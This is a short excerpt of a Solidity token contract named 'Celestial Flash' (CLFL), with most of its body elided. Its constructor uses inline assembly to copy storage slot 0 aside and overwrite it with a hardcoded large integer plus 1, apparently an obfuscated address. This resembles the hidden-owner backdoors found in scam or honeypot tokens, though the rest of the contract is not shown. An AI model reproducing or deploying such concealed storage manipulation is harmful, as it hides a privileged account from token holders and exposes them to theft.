...
contract CelestialFlash {
    string public constant name = "Celestial Flash";
    string public constant symbol = "CLFL";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(591418216165335042535446763750727994657529984659, 1))}
